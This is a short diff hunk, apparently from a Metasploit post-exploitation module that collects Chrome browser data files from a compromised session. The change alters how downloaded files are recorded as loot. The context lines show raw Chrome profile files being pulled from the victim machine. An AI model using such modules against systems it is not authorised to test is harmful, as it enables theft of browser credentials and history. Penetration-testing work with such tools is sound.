@@ -131,7 +131,7 @@ class Metasploit3 < Msf::Post
 			end
 
 			# Store raw data
-			local_path = store_loot("chrome.raw.#{f}", "text/plain", session.tunnel_peer, "chrome_raw_#{f}")
+			local_path = store_loot("chrome.raw.#{f}", "text/plain", session, "chrome_raw_#{f}")
 			raw_files[f] = local_path
 			session.fs.file.download_file(local_path, remote_path)
 			print_status("Downloaded #{f} to '#{local_path}'")
